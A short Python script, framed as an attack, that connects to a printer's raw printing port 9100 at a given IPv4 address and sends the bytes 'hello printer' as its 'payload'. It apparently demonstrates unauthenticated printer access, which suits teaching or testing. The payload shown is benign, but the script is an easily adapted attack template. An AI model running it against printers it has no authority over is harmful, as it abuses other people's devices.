import re
import sys
import socket
from ipaddress import IPv4Address

def parse_address():
	try:
		if not len(sys.argv) > 1:
			raise ValueError("Please pass in the printer's IPv4 address")
		if not re.match(r"^[0-9]{1,3}(\.[0-9]{1,3}){3}$", sys.argv[1]):
			raise ValueError("Please enter a valid IPv4 address")
		return IPv4Address(sys.argv[1])
	except ValueError as error:
		print(f'Error: {error}.\nExiting.')
		sys.exit(1)

def attack_target(address):
	target = (address.exploded, 9100)
	# create a tcp socket
	tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print(f'Connecting to {target[0]}:{target[1]}')
	# connect to the target printer
	tcp_socket.connect(target)
	# send payload to the printer
	tcp_socket.sendall(b'hello printer')
	# close socket connection
	tcp_socket.close()

if __name__ == "__main__":
	address = parse_address()
	attack_target(address)
